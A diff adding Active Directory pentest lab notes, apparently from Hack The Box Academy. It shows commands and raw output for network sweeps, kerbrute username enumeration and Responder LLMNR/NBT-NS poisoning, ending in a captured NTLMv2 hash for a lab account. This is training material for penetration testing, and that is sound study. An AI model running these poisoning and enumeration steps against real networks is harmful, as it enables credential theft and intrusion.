@@ -152,5 +152,179 @@ Group3r is useful for auditing and finding security misconfigurations in AD Grou
 [ADRecon 	](https://github.com/adrecon/ADRecon)
 A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.
 
+```
+keylian zergainoh@htb[/htb]$ sudo tcpdump -i ens224 
+```
 
+```
+sudo responder -I ens224 -A
+```
+
+```
+keylian zergainoh@htb[/htb]$ fping -asgq 172.16.5.0/23
+
+172.16.5.5
+172.16.5.25
+172.16.5.50
+172.16.5.100
+172.16.5.125
+172.16.5.200
+172.16.5.225
+172.16.5.238
+172.16.5.240
+
+     510 targets
+       9 alive
+     501 unreachable
+       0 unknown addresses
+
+    2004 timeouts (waiting for response)
+    2013 ICMP Echos sent
+       9 ICMP Echo Replies received
+    2004 other ICMP received
+
+ 0.029 ms (min round trip time)
+ 0.396 ms (avg round trip time)
+ 0.799 ms (max round trip time)
+       15.366 sec (elapsed real time)
+```
+
+```
+sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+
+2021/11/17 23:01:46 >  Using KDC(s):
+2021/11/17 23:01:46 >   172.16.5.5:88
+2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL
+
+ <SNIP>
+ 
+2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
+2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds
+
+```
+```
+ifconfig                                                                                                                                                            
+docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:30:d9:b2:11  txqueuelen 0  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.129.225.134  netmask 255.255.0.0  broadcast 10.129.255.255
+        inet6 fe80::f6ff:1908:eacf:8269  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::e79b:94bf:10e9:62b1  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:94:cb:1b  txqueuelen 1000  (Ethernet)
+        RX packets 2109  bytes 249773 (243.9 KiB)
+        RX errors 0  dropped 100  overruns 0  frame 0
+        TX packets 796  bytes 112882 (110.2 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
+        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:94:f6:d6  txqueuelen 1000  (Ethernet)
+        RX packets 66800  bytes 4451108 (4.2 MiB)
+        RX errors 0  dropped 15  overruns 0  frame 0
+        TX packets 58933  bytes 4354434 (4.1 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+sudo responder -I ens224
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [ens224]
+    Responder IP               [172.16.5.225]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-6UNMJVF6525]
+    Responder Domain Name      [IRTA.LOCAL]
+    Responder DCE-RPC Port     [48360]
+[!] Error starting TCP server on port 3389, check permissions or other servers running.
+
+[+] Listening for events...                                                                                                                                               
+
+[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
+[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
+[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
+[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
+[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
+[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+[*] [NBT-NS] Poisoned answer sent to 172.16.5.130 for name ACADEMY-EA-WEB0 (service: Workstation/Redirector)
+[*] [MDNS] Poisoned answer sent to 172.16.5.130    for name academy-ea-web0.local
+[*] [LLMNR]  Poisoned answer sent to 172.16.5.130 for name academy-ea-web0
+[MSSQL] NTLMv2 Client   : 172.16.5.130
+[MSSQL] NTLMv2 Username : INLANEFREIGHT\lab_adm
+[MSSQL] NTLMv2 Hash     : lab_adm::INLANEFREIGHT:4aefe98c2befd788:193DEA5E4A4EB9F41ABC813C57F52A52:0101000000000000ABEE2646896DDB0186215D3ADAB2B6560000000002000800490052005400410001001E00570049004E002D00360055004E004D004A005600460036003500320035000400140049005200540041002E004C004F00430041004C0003003400570049004E002D00360055004E004D004A005600460036003500320035002E0049005200540041002E004C004F00430041004C000500140049005200540041002E004C004F00430041004C000800300030000000000000000000000000300000E3A522B26D265DC9C530A9F499332569AC2F333F2A78B1254A01CE6E5A29E9AB0A0010000000000000000000000000000000000009003A004D005300530051004C005300760063002F00610063006100640065006D0079002D00650061002D0077006500620030003A0031003400330033000000000000000000 
+........................................
+
+```
 
